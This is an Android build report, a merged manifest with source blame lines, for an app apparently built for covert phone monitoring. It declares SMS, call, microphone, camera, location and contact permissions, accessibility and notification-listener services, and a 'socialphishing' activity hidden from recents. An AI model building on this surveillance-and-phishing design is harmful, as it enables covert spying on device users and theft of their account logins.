app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.github.midros.istheapp"
4    android:versionCode="1"
5    android:versionName="2.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
8-->src/main/AndroidManifest.xml
9        android:targetSdkVersion="26" />
9-->src/main/AndroidManifest.xml
10    <!-- location -->
11    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
11-->src/main/AndroidManifest.xml:6:5-79
11-->src/main/AndroidManifest.xml:6:22-76
12    <!-- storage -->
13    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
13-->src/main/AndroidManifest.xml:8:5-81
13-->src/main/AndroidManifest.xml:8:22-78
14    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
14-->src/main/AndroidManifest.xml:9:5-80
14-->src/main/AndroidManifest.xml:9:22-77
15    <!-- calls -->
16    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
16-->src/main/AndroidManifest.xml:11:5-81
16-->src/main/AndroidManifest.xml:11:22-78
17    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
17-->src/main/AndroidManifest.xml:12:5-75
17-->src/main/AndroidManifest.xml:12:22-72
18    <uses-permission android:name="android.permission.CALL_PHONE" />
18-->src/main/AndroidManifest.xml:13:5-68
18-->src/main/AndroidManifest.xml:13:22-66
19    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
19-->src/main/AndroidManifest.xml:14:5-15:47
19-->src/main/AndroidManifest.xml:14:22-76
20    <uses-permission android:name="android.permission.RECORD_AUDIO" />
20-->src/main/AndroidManifest.xml:16:5-71
20-->src/main/AndroidManifest.xml:16:22-68
21    <uses-permission android:name="android.permission.READ_CONTACTS" />
21-->src/main/AndroidManifest.xml:17:5-72
21-->src/main/AndroidManifest.xml:17:22-69
22    <!-- message -->
23    <uses-permission android:name="android.permission.RECEIVE_SMS" />
23-->src/main/AndroidManifest.xml:19:5-70
23-->src/main/AndroidManifest.xml:19:22-67
24    <uses-permission android:name="android.permission.READ_SMS" />
24-->src/main/AndroidManifest.xml:20:5-67
24-->src/main/AndroidManifest.xml:20:22-64
25    <uses-permission android:name="android.permission.SEND_SMS" />
25-->src/main/AndroidManifest.xml:21:5-67
25-->src/main/AndroidManifest.xml:21:22-64
26    <uses-permission android:name="android.permission.WRITE_SMS" />
26-->src/main/AndroidManifest.xml:22:5-68
26-->src/main/AndroidManifest.xml:22:22-65
27    <!-- camera -->
28    <uses-permission android:name="android.permission.CAMERA" />
28-->src/main/AndroidManifest.xml:24:5-65
28-->src/main/AndroidManifest.xml:24:22-62
29    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
29-->src/main/AndroidManifest.xml:25:5-78
29-->src/main/AndroidManifest.xml:25:22-75
30
31    <uses-feature
31-->src/main/AndroidManifest.xml:27:5-29:35
32        android:name="android.hardware.camera"
32-->src/main/AndroidManifest.xml:28:9-47
33        android:required="true" />
33-->src/main/AndroidManifest.xml:29:9-32
34
35    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
35-->src/main/AndroidManifest.xml:31:5-79
35-->src/main/AndroidManifest.xml:31:22-76
36    <uses-permission android:name="android.permission.INTERNET" />
36-->src/main/AndroidManifest.xml:32:5-67
36-->src/main/AndroidManifest.xml:32:22-64
37    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
37-->src/main/AndroidManifest.xml:33:5-81
37-->src/main/AndroidManifest.xml:33:22-78
38    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
38-->src/main/AndroidManifest.xml:34:5-84
38-->src/main/AndroidManifest.xml:34:22-81
39    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
39-->src/main/AndroidManifest.xml:35:5-94
39-->src/main/AndroidManifest.xml:35:22-92
40    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
40-->src/main/AndroidManifest.xml:36:5-38:47
40-->src/main/AndroidManifest.xml:37:9-62
41
42    <!-- vibrate -->
43    <uses-permission android:name="android.permission.VIBRATE" />
43-->src/main/AndroidManifest.xml:41:5-66
43-->src/main/AndroidManifest.xml:41:22-63
44
45    <uses-feature
45-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:26:5-28:35
46        android:glEsVersion="0x00020000"
46-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:27:9-41
47        android:required="true" />
47-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:28:9-32
48
49    <uses-permission android:name="android.permission.WAKE_LOCK" /> <!-- Required by older versions of Google Play services to create IID tokens -->
49-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:24:5-68
49-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:24:22-65
50    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
50-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:26:5-82
50-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:26:22-79
51    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
51-->[com.google.android.gms:play-services-measurement:17.2.0] AndroidManifest.xml:26:5-110
51-->[com.google.android.gms:play-services-measurement:17.2.0] AndroidManifest.xml:26:22-107
52
53    <application
53-->src/main/AndroidManifest.xml:43:5-145:19
54        android:name="com.github.midros.istheapp.app.IsTheApp"
54-->src/main/AndroidManifest.xml:44:9-37
55        android:allowBackup="true"
55-->src/main/AndroidManifest.xml:45:9-35
56        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
56-->[androidx.core:core:1.1.0] AndroidManifest.xml:24:18-86
57        android:debuggable="true"
58        android:icon="@mipmap/ic_launcher"
58-->src/main/AndroidManifest.xml:46:9-43
59        android:label="@string/app_name"
59-->src/main/AndroidManifest.xml:47:9-41
60        android:roundIcon="@mipmap/ic_launcher"
60-->src/main/AndroidManifest.xml:48:9-48
61        android:sharedUserId="android.uid.system"
61-->src/main/AndroidManifest.xml:52:9-50
62        android:supportsRtl="true"
62-->src/main/AndroidManifest.xml:49:9-35
63        android:testOnly="true"
64        android:theme="@style/AppTheme" >
64-->src/main/AndroidManifest.xml:50:9-40
65        <activity
65-->src/main/AndroidManifest.xml:54:9-62:20
66            android:name="com.github.midros.istheapp.ui.activities.login.LoginActivity"
66-->src/main/AndroidManifest.xml:55:13-62
67            android:theme="@style/Login" >
67-->src/main/AndroidManifest.xml:56:13-41
68            <intent-filter>
68-->src/main/AndroidManifest.xml:57:13-61:29
69                <action android:name="android.intent.action.MAIN" />
69-->src/main/AndroidManifest.xml:58:17-69
69-->src/main/AndroidManifest.xml:58:25-66
70
71                <category android:name="android.intent.category.LAUNCHER" />
71-->src/main/AndroidManifest.xml:60:17-77
71-->src/main/AndroidManifest.xml:60:27-74
72            </intent-filter>
73        </activity>
74        <activity
74-->src/main/AndroidManifest.xml:63:9-65:44
75            android:name="com.github.midros.istheapp.ui.activities.register.RegisterActivity"
75-->src/main/AndroidManifest.xml:64:13-68
76            android:theme="@style/Login" />
76-->src/main/AndroidManifest.xml:65:13-41
77        <activity
77-->src/main/AndroidManifest.xml:66:9-69:62
78            android:name="com.github.midros.istheapp.ui.activities.mainparent.MainParentActivity"
78-->src/main/AndroidManifest.xml:67:13-72
79            android:configChanges="orientation|screenSize"
79-->src/main/AndroidManifest.xml:69:13-59
80            android:theme="@style/AppTheme" />
80-->src/main/AndroidManifest.xml:68:13-44
81        <activity
81-->src/main/AndroidManifest.xml:70:9-73:62
82            android:name="com.github.midros.istheapp.ui.activities.mainchild.MainChildActivity"
82-->src/main/AndroidManifest.xml:71:13-70
83            android:configChanges="orientation|screenSize"
83-->src/main/AndroidManifest.xml:73:13-59
84            android:theme="@style/Child" />
84-->src/main/AndroidManifest.xml:72:13-41
85        <activity
85-->src/main/AndroidManifest.xml:74:9-76:43
86            android:name="com.github.midros.istheapp.ui.activities.lock.LockActivity"
86-->src/main/AndroidManifest.xml:75:13-60
87            android:theme="@style/Lock" />
87-->src/main/AndroidManifest.xml:76:13-40
88        <activity
88-->src/main/AndroidManifest.xml:77:9-80:50
89            android:name="com.github.midros.istheapp.ui.activities.gallery.ViewPhoto"
89-->src/main/AndroidManifest.xml:78:13-60
90            android:configChanges="orientation|screenSize"
90-->src/main/AndroidManifest.xml:79:13-59
91            android:theme="@style/Transparent" />
91-->src/main/AndroidManifest.xml:80:13-47
92        <activity
92-->src/main/AndroidManifest.xml:81:9-86:45
93            android:name="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
93-->src/main/AndroidManifest.xml:82:13-73
94            android:configChanges="orientation|screenSize"
94-->src/main/AndroidManifest.xml:83:13-59
95            android:excludeFromRecents="true"
95-->src/main/AndroidManifest.xml:84:13-46
96            android:taskAffinity="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
96-->src/main/AndroidManifest.xml:85:13-107
97            android:theme="@style/Social" />
97-->src/main/AndroidManifest.xml:86:13-42
98
99        <!-- Services -->
100        <service android:name="com.github.midros.istheapp.services.calls.CallsService" />
100-->src/main/AndroidManifest.xml:89:9-64
100-->src/main/AndroidManifest.xml:89:18-61
101        <service android:name="com.github.midros.istheapp.services.sms.SmsService" />
101-->src/main/AndroidManifest.xml:90:9-60
101-->src/main/AndroidManifest.xml:90:18-57
102        <service android:name="com.github.midros.istheapp.services.social.MonitorService" />
102-->src/main/AndroidManifest.xml:91:9-67
102-->src/main/AndroidManifest.xml:91:18-64
103        <service
103-->src/main/AndroidManifest.xml:92:9-104:19
104            android:name="com.github.midros.istheapp.services.accessibilityData.AccessibilityDataService"
104-->src/main/AndroidManifest.xml:93:13-80
105            android:label="@string/accessibility_service_label"
105-->src/main/AndroidManifest.xml:94:13-64
106            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
106-->src/main/AndroidManifest.xml:95:13-79
107            <intent-filter>
107-->src/main/AndroidManifest.xml:97:13-99:29
108                <action android:name="android.accessibilityservice.AccessibilityService" />
108-->src/main/AndroidManifest.xml:98:17-92
108-->src/main/AndroidManifest.xml:98:25-89
109            </intent-filter>
110
111            <meta-data
111-->src/main/AndroidManifest.xml:101:13-103:72
112                android:name="android.accessibilityservice"
112-->src/main/AndroidManifest.xml:102:17-60
113                android:resource="@xml/accessibility_service_config" />
113-->src/main/AndroidManifest.xml:103:17-69
114        </service>
115        <service
115-->src/main/AndroidManifest.xml:105:9-111:19
116            android:name="com.github.midros.istheapp.services.notificationService.NotificationService"
116-->src/main/AndroidManifest.xml:106:13-77
117            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
117-->src/main/AndroidManifest.xml:107:13-87
118            <intent-filter>
118-->src/main/AndroidManifest.xml:108:13-110:29
119                <action android:name="android.service.notification.NotificationListenerService" />
119-->src/main/AndroidManifest.xml:109:17-99
119-->src/main/AndroidManifest.xml:109:25-96
120            </intent-filter>
121        </service>
122
123        <!-- Receivers -->
124        <receiver
124-->src/main/AndroidManifest.xml:114:9-122:20
125            android:name="com.github.midros.istheapp.receiver.SmsReceiver"
125-->src/main/AndroidManifest.xml:115:13-49
126            android:enabled="true"
126-->src/main/AndroidManifest.xml:116:13-35
127            android:exported="true"
127-->src/main/AndroidManifest.xml:117:13-36
128            android:permission="android.permission.BROADCAST_SMS" >
128-->src/main/AndroidManifest.xml:118:13-66
129            <intent-filter android:priority="999" >
129-->src/main/AndroidManifest.xml:119:13-121:29
129-->src/main/AndroidManifest.xml:119:28-50
130                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
130-->src/main/AndroidManifest.xml:120:17-82
130-->src/main/AndroidManifest.xml:120:25-79
131            </intent-filter>
132        </receiver>
133        <receiver android:name="com.github.midros.istheapp.receiver.CallsReceiver" >
133-->src/main/AndroidManifest.xml:123:9-128:20
133-->src/main/AndroidManifest.xml:123:19-57
134            <intent-filter android:priority="999" >
134-->src/main/AndroidManifest.xml:124:13-127:29
134-->src/main/AndroidManifest.xml:124:28-50
135                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
135-->src/main/AndroidManifest.xml:125:17-82
135-->src/main/AndroidManifest.xml:125:25-79
136                <action android:name="android.intent.action.PHONE_STATE" />
136-->src/main/AndroidManifest.xml:126:17-76
136-->src/main/AndroidManifest.xml:126:25-73
137            </intent-filter>
138        </receiver>
139        <receiver
139-->src/main/AndroidManifest.xml:129:9-136:20
140            android:name="com.github.midros.istheapp.receiver.MonitorReceiver"
140-->src/main/AndroidManifest.xml:130:13-53
141            android:enabled="true"
141-->src/main/AndroidManifest.xml:131:13-35
142            android:exported="false" >
142-->src/main/AndroidManifest.xml:132:13-37
143            <intent-filter>
143-->src/main/AndroidManifest.xml:133:13-135:29
144                <action android:name="com.github.midros.istheapp.receiver.RESTART_MONITOR_RECEIVER" />
144-->src/main/AndroidManifest.xml:134:17-103
144-->src/main/AndroidManifest.xml:134:25-100
145            </intent-filter>
146        </receiver>
147
148        <meta-data
148-->src/main/AndroidManifest.xml:138:9-140:69
149            android:name="com.google.android.gms.version"
149-->src/main/AndroidManifest.xml:139:13-58
150            android:value="@integer/google_play_services_version" />
150-->src/main/AndroidManifest.xml:140:13-66
151        <meta-data
151-->src/main/AndroidManifest.xml:141:9-143:52
152            android:name="com.google.android.maps.v2.API_KEY"
152-->src/main/AndroidManifest.xml:142:13-62
153            android:value="@string/APY_KEY_MAPS" />
153-->src/main/AndroidManifest.xml:143:13-49
154        <meta-data
154-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:19:9-21:63
155            android:name="com.facebook.sdk.ApplicationId"
155-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:20:13-58
156            android:value="@string/facebook_application_id" />
156-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:21:13-60
157
158        <activity
158-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:23:9-27:61
159            android:name="com.firebase.ui.auth.KickoffActivity"
159-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:24:13-64
160            android:exported="false"
160-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:25:13-37
161            android:label=""
161-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:26:13-29
162            android:theme="@style/FirebaseUI.Transparent" />
162-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:27:13-58
163        <activity
163-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:28:9-32:61
164            android:name="com.firebase.ui.auth.ui.idp.SingleSignInActivity"
164-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:29:13-76
165            android:exported="false"
165-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:30:13-37
166            android:label=""
166-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:31:13-29
167            android:theme="@style/FirebaseUI.Transparent" />
167-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:32:13-58
168        <activity
168-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:33:9-37:61
169            android:name="com.firebase.ui.auth.ui.credentials.CredentialSaveActivity"
169-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:34:13-86
170            android:exported="false"
170-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:35:13-37
171            android:label=""
171-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:36:13-29
172            android:theme="@style/FirebaseUI.Transparent" />
172-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:37:13-58
173        <activity
173-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:38:9-42:58
174            android:name="com.firebase.ui.auth.ui.email.RecoverPasswordActivity"
174-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:39:13-81
175            android:exported="false"
175-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:40:13-37
176            android:label="@string/fui_title_recover_password_activity"
176-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:41:13-72
177            android:windowSoftInputMode="adjustResize" />
177-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:42:13-55
178        <activity
178-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:43:9-47:58
179            android:name="com.firebase.ui.auth.ui.email.EmailActivity"
179-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:44:13-71
180            android:exported="false"
180-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:45:13-37
181            android:label="@string/fui_sign_in_default"
181-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:46:13-56
182            android:windowSoftInputMode="adjustResize" />
182-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:47:13-55
183        <activity
183-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:48:9-52:77
184            android:name="com.firebase.ui.auth.ui.phone.PhoneActivity"
184-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:49:13-71
185            android:exported="false"
185-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:50:13-37
186            android:label="@string/fui_sign_in_with_phone_number"
186-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:51:13-66
187            android:windowSoftInputMode="adjustResize|stateAlwaysVisible" />
187-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:52:13-74
188        <activity
188-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:53:9-57:58
189            android:name="com.firebase.ui.auth.ui.idp.WelcomeBackIdpPrompt"
189-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:54:13-76
190            android:exported="false"
190-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:55:13-37
191            android:label="@string/fui_title_welcome_back_idp_prompt"
191-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:56:13-70
192            android:windowSoftInputMode="adjustResize" />
192-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:57:13-55
193        <activity
193-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:58:9-62:58
194            android:name="com.firebase.ui.auth.ui.email.WelcomeBackPasswordPrompt"
194-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:59:13-83
195            android:exported="false"
195-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:60:13-37
196            android:label="@string/fui_title_welcome_back_password_prompt"
196-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:61:13-75
197            android:windowSoftInputMode="adjustResize" />
197-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:62:13-55
198        <activity
198-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:63:9-67:58
199            android:name="com.firebase.ui.auth.ui.email.WelcomeBackEmailLinkPrompt"
199-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:64:13-84
200            android:exported="false"
200-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:65:13-37
201            android:label="@string/fui_title_welcome_back_password_prompt"
201-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:66:13-75
202            android:windowSoftInputMode="adjustResize" />
202-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:67:13-55
203        <activity
203-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:68:9-73:58
204            android:name="com.firebase.ui.auth.ui.email.EmailLinkCatcherActivity"
204-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:69:13-82
205            android:exported="false"
205-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:70:13-37
206            android:label=""
206-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:71:13-29
207            android:theme="@style/FirebaseUI.Transparent"
207-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:72:13-58
208            android:windowSoftInputMode="adjustResize" />
208-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:73:13-55
209        <activity
209-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:74:9-78:58
210            android:name="com.firebase.ui.auth.ui.email.EmailLinkErrorRecoveryActivity"
210-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:75:13-88
211            android:exported="false"
211-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:76:13-37
212            android:label="@string/fui_sign_in_default"
212-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:77:13-56
213            android:windowSoftInputMode="adjustResize" />
213-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:78:13-55
214        <activity
214-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:79:9-82:65
215            android:name="com.firebase.ui.auth.ui.idp.AuthMethodPickerActivity"
215-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:80:13-80
216            android:exported="false"
216-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:81:13-37
217            android:label="@string/fui_default_toolbar_title" />
217-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:82:13-62
218        <activity
218-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:83:9-87:48
219            android:name="com.facebook.FacebookActivity"
219-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:84:13-57
220            android:configChanges="keyboard|keyboardHidden|screenLayout|screenSize|orientation"
220-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:85:13-96
221            android:label="@string/app_name" />
221-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:86:13-45
222        <activity
222-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:88:9-100:20
223            android:name="com.facebook.CustomTabActivity"
223-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:89:13-58
224            android:exported="true" >
224-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:90:13-36
225            <intent-filter>
225-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:92:13-99:29
226                <action android:name="android.intent.action.VIEW" />
226-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:93:17-69
226-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:93:25-66
227
228                <category android:name="android.intent.category.DEFAULT" />
228-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:95:17-76
228-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:95:27-73
229                <category android:name="android.intent.category.BROWSABLE" />
229-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:96:17-78
229-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:96:27-75
230
231                <data android:scheme="@string/facebook_login_protocol_scheme" />
231-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:98:17-81
231-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:98:23-78
232            </intent-filter>
233        </activity>
234
235        <provider
235-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:102:9-106:38
236            android:name="com.firebase.ui.auth.data.client.AuthUiInitProvider"
236-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:103:13-79
237            android:authorities="com.github.midros.istheapp.authuiinitprovider"
237-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:104:13-70
238            android:exported="false"
238-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:105:13-37
239            android:initOrder="90" />
239-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:106:13-35
240
241        <activity
241-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:24:9-31:50
242            android:name="com.google.firebase.auth.internal.FederatedSignInActivity"
242-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:25:13-85
243            android:excludeFromRecents="true"
243-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:26:13-46
244            android:exported="true"
244-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:27:13-36
245            android:launchMode="singleTask"
245-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:28:13-44
246            android:permission="com.google.firebase.auth.api.gms.permission.LAUNCH_FEDERATED_SIGN_IN"
246-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:29:13-102
247            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
247-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:30:13-72
248
249        <service
249-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:33:9-39:19
250            android:name="com.google.firebase.components.ComponentDiscoveryService"
250-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:34:13-84
251            android:directBootAware="true"
251-->[com.google.firebase:firebase-common:19.1.0] AndroidManifest.xml:14:13-43
252            android:exported="false" >
252-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:35:13-37
253            <meta-data
253-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:36:13-38:85
254                android:name="com.google.firebase.components:com.google.firebase.auth.FirebaseAuthRegistrar"
254-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:37:17-109
255                android:value="com.google.firebase.components.ComponentRegistrar" />
255-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:38:17-82
256            <meta-data
256-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:32:13-34:85
257                android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
257-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:33:17-109
258                android:value="com.google.firebase.components.ComponentRegistrar" />
258-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:34:17-82
259            <meta-data
259-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:33:13-35:85
260                android:name="com.google.firebase.components:com.google.firebase.storage.StorageRegistrar"
260-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:34:17-107
261                android:value="com.google.firebase.components.ComponentRegistrar" />
261-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:35:17-82
262            <meta-data
262-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:18:13-20:85
263                android:name="com.google.firebase.components:com.google.firebase.firestore.FirestoreRegistrar"
263-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:19:17-111
264                android:value="com.google.firebase.components.ComponentRegistrar" />
264-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:20:17-82
265            <meta-data
265-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:30:13-32:85
266                android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar"
266-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:31:17-139
267                android:value="com.google.firebase.components.ComponentRegistrar" />
267-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:32:17-82
268            <meta-data
268-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:32:13-34:85
269                android:name="com.google.firebase.components:com.google.firebase.iid.Registrar"
269-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:33:17-96
270                android:value="com.google.firebase.components.ComponentRegistrar" />